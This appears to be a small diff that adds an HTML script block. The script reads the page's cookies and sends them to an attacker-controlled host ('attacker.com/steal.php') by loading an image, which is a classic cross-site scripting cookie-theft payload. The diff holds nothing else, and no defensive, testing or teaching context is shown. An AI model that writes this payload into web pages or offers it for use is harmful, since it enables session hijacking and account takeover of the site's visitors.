@@ -1,0 +1,7 @@
+html
+<script>
+  var cookieValue = document.cookie;
+  // Send the cookie value to an attacker-controlled server
+  var img = new Image();
+  img.src = 'http://attacker.com/steal.php?cookie=' + encodeURIComponent(cookieValue);
+</script>
